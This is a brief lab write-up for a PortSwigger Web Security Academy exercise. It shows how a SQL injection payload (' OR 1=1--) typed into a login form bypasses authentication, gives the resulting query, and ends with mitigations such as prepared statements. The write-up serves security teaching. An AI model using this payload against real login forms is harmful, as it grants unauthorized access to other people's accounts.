# SQL Injection Authentication Bypass

Platform: PortSwigger Web Security Academy  
Category: SQL Injection  

## Overview

This lab demonstrates a SQL injection vulnerability in a login form where user input is directly inserted into a SQL query without proper sanitization.

## Intercepting the Request

Using Burp Suite, the login request was intercepted.

Example request:

POST /login  
username=admin&password=test

## Exploitation

Payload used:

' OR 1=1--

The payload modifies the SQL condition to always return TRUE.

Example SQL query:

SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1--

## Result

The application grants access to the admin account without valid credentials.

## Impact

Attackers could bypass authentication and gain unauthorized access to user accounts.

## Mitigation

- Use prepared statements
- Parameterized queries
- Input validation
- ORM frameworks
